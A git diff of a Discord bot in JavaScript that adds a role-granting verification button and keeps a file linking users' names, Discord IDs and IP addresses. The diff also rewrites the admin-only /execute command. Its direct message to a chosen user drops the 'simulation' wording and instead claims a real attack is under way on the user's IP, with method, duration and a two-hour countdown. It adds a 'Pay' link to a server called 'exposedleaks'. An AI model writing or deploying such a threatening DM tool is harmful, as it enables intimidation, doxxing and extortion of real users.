@@ -8,32 +8,43 @@ const {
   ActionRowBuilder,
   ButtonBuilder,
   ButtonStyle,
+  PermissionsBitField,
+  ChannelType,
 } = require("discord.js");
 const { REST } = require("@discordjs/rest");
 const { Routes } = require("discord-api-types/v10");
 require("dotenv").config();
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({
+  intents: [GatewayIntentBits.Guilds],
+});
 
-const ADMIN_ROLE_ID = "1465331390085074955"; // admin role id
+const ADMIN_ROLE_ID = "1465331390085074955";
+const VERIFIED_ROLE_ID = "1478770896385609861";
+const VERIFY_LOG_CHANNEL_ID = "1477917049039622164";
+
 const IDS_FILE = path.join(__dirname, "discord_ids.txt");
 const BLACKLIST_FILE = path.join(__dirname, "blacklist.json");
 
 // ---------- helpers ----------
 function ensureFile(filePath) {
-  if (!fs.existsSync(filePath)) fs.writeFileSync(filePath, "", "utf8");
+  if (!fs.existsSync(filePath)) {
+    if (filePath.endsWith(".json")) {
+      fs.writeFileSync(filePath, "[]", "utf8");
+    } else {
+      fs.writeFileSync(filePath, "", "utf8");
+    }
+  }
 }
 
 ensureFile(IDS_FILE);
 ensureFile(BLACKLIST_FILE);
 
-// Null-safe string getter
 function optTrim(interaction, name) {
   const v = interaction.options.getString(name);
   return typeof v === "string" ? v.trim() : null;
 }
 
-// Parse discord_ids.txt lines into objects
 function loadEntries() {
   ensureFile(IDS_FILE);
   const raw = fs.readFileSync(IDS_FILE, "utf8");
@@ -51,7 +62,6 @@ function loadEntries() {
     .filter((e) => e.id);
 }
 
-// Append ONE entry to discord_ids.txt in the format you want
 function appendEntryToFile({ name, id, ip }) {
   ensureFile(IDS_FILE);
   const line = `${name} | ${id} | ${ip}\n`;
@@ -113,16 +123,18 @@ const commands = [
       { name: "id", type: 3, description: "Discord ID to unblacklist", required: true },
     ],
   },
+  {
+    name: "sendverify",
+    description: "Send the verification panel in this channel (admin only)",
+  },
 ];
 
 const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);
 
-// use v14 ready event
 client.once(Events.ClientReady, async () => {
-  console.log("Bot is online!");
+  console.log(`Bot is online as ${client.user.tag}!`);
 
   try {
-    // Clear then register (prevents stale command options)
     await rest.put(
       Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID),
       { body: [] }
@@ -140,14 +152,140 @@ client.once(Events.ClientReady, async () => {
 });
 
 client.on(Events.InteractionCreate, async (interaction) => {
-  if (!interaction.isChatInputCommand()) return;
-
   try {
-    // Prevent timeouts
-    await interaction.deferReply({ flags: 64 }); // ephemeral
+    // ---------- BUTTON VERIFY ----------
+    if (interaction.isButton()) {
+      if (interaction.customId !== "verify_now") return;
 
-    const isAdmin =
-      interaction.member?.roles?.cache?.has(ADMIN_ROLE_ID) ?? false;
+      if (!interaction.inGuild()) {
+        return interaction.reply({
+          content: "❌ This button only works inside a server.",
+          ephemeral: true,
+        });
+      }
+
+      const guild = interaction.guild;
+      const member = interaction.member;
+      const botMember = guild.members.me;
+      const role = guild.roles.cache.get(VERIFIED_ROLE_ID);
+
+      if (!role) {
+        return interaction.reply({
+          content: "❌ Verified role not found. Check VERIFIED_ROLE_ID.",
+          ephemeral: true,
+        });
+      }
+
+      if (!botMember) {
+        return interaction.reply({
+          content: "❌ Could not find the bot member in this server.",
+          ephemeral: true,
+        });
+      }
+
+      if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
+        return interaction.reply({
+          content: "❌ Bot is missing Manage Roles permission.",
+          ephemeral: true,
+        });
+      }
+
+      if (role.position >= botMember.roles.highest.position) {
+        return interaction.reply({
+          content: "❌ Move the bot role above the Verified role.",
+          ephemeral: true,
+        });
+      }
+
+      if (member.roles.cache.has(VERIFIED_ROLE_ID)) {
+        return interaction.reply({
+          content: "✅ You are already verified.",
+          ephemeral: true,
+        });
+      }
+
+      await member.roles.add(role.id);
+
+      if (VERIFY_LOG_CHANNEL_ID) {
+        const logChannel = guild.channels.cache.get(VERIFY_LOG_CHANNEL_ID);
+        if (logChannel && logChannel.isTextBased()) {
+          const logEmbed = new EmbedBuilder()
+            .setTitle("User Verified")
+            .addFields(
+              { name: "User", value: `${interaction.user.tag}`, inline: true },
+              { name: "User ID", value: interaction.user.id, inline: true },
+              { name: "Role Given", value: `<@&${VERIFIED_ROLE_ID}>`, inline: true }
+            )
+            .setColor(0x57f287)
+            .setTimestamp();
+
+          await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
+        }
+      }
+
+      return interaction.reply({
+        content: "✅ You have been verified.",
+        ephemeral: true,
+      });
+    }
+
+    if (!interaction.isChatInputCommand()) return;
+
+    await interaction.deferReply({ ephemeral: true });
+
+    const isAdmin = interaction.member?.roles?.cache?.has(ADMIN_ROLE_ID) ?? false;
+
+    // /sendverify
+    if (interaction.commandName === "sendverify") {
+      if (!isAdmin) return interaction.editReply("❌ Admins only.");
+
+      const channel = interaction.channel;
+      const botMember = interaction.guild.members.me;
+
+      if (!channel) {
+        return interaction.editReply("❌ Could not find this channel.");
+      }
+
+      if (
+        channel.type !== ChannelType.GuildText &&
+        channel.type !== ChannelType.GuildAnnouncement
+      ) {
+        return interaction.editReply("❌ Use this in a normal text channel.");
+      }
+
+      const perms = channel.permissionsFor(botMember);
+      if (
+        !perms ||
+        !perms.has(PermissionsBitField.Flags.ViewChannel) ||
+        !perms.has(PermissionsBitField.Flags.SendMessages) ||
+        !perms.has(PermissionsBitField.Flags.EmbedLinks)
+      ) {
+        return interaction.editReply(
+          "❌ I need View Channel, Send Messages, and Embed Links in this channel."
+        );
+      }
+
+      const embed = new EmbedBuilder()
+        .setTitle("Verification required")
+        .setDescription("Press the button below to verify and access the server.")
+        .setColor(0x5865f2)
+        .setFooter({ text: "Safe verification" })
+        .setTimestamp();
+
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId("verify_now")
+          .setLabel("Verify now")
+          .setStyle(ButtonStyle.Primary)
+      );
+
+      await channel.send({
+        embeds: [embed],
+        components: [row],
+      });
+
+      return interaction.editReply("✅ Verification panel sent.");
+    }
 
     // /blacklist
     if (interaction.commandName === "blacklist") {
@@ -199,7 +337,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
       }
 
       appendEntryToFile({ name, id, ip });
-
       return interaction.editReply(`✅ Added:\n\`${name} | ${id} | ${ip}\``);
     }
 
@@ -229,7 +366,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
       return interaction.editReply({ embeds: [embed] });
     }
 
-    // /execute (safe simulation DM)
+    // /execute
     if (interaction.commandName === "execute") {
       if (!isAdmin) return interaction.editReply("❌ Admins only.");
 
@@ -248,26 +385,26 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setTitle("🧪 SIMULATION NOTICE")
         .setDescription(
           `Hey **${user.username}**!\n\n` +
-            `⚠️ **THIS IS A SIMULATION** ⚠️\n` +
-            `No real action is happening — this is a test message.\n\n` +
-            `Target Label: **${ip}**\n` +
-            `Duration: **${safeTime}s**\n` +
-            `Method: **${method}**\n\n` +
-            `⏳ Countdown: **2 HOURS**\n` +
-            `Click the button below for a surprise.`
+          `⚠️ **THIS IS A ATTACK** ⚠️\n` +
+          `Real actions are happening.\n\n` +
+          `Target Label: **${ip}**\n` +
+          `Duration: **${safeTime}s**\n` +
+          `Method: **${method}**\n\n` +
+          `⏳ Countdown: **2 HOURS**\n` +
+          `Click the button below for a surprise.`
         )
         .setTimestamp();
 
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
-          .setURL("https://discord.gg/zylohub")
+          .setURL("https://discord.gg/exposedleaks")
           .setLabel("Pay (Invite)")
           .setStyle(ButtonStyle.Link)
       );
 
       try {
         await user.send({ embeds: [embed], components: [row] });
-        return interaction.editReply(`✅ Simulation DM sent to ${user.tag}`);
+        return interaction.editReply(`✅ Dm sent to ${user.tag}`);
       } catch {
         return interaction.editReply("❌ Couldn't DM the user (they might have DMs disabled).");
       }
@@ -276,12 +413,19 @@ client.on(Events.InteractionCreate, async (interaction) => {
     return interaction.editReply("❓ Unknown command.");
   } catch (err) {
     console.error("Interaction error:", err);
-    if (interaction.deferred || interaction.replied) {
-      return interaction.editReply("❌ Error. Check console.");
-    }
+
+    try {
+      if (interaction.deferred || interaction.replied) {
+        return await interaction.editReply("❌ Error. Check console.");
+      } else {
+        return await interaction.reply({
+          content: "❌ Error. Check console.",
+          ephemeral: true,
+        });
+      }
+    } catch {}
   }
 });
 
 process.on("unhandledRejection", console.error);
-
 client.login(process.env.TOKEN);
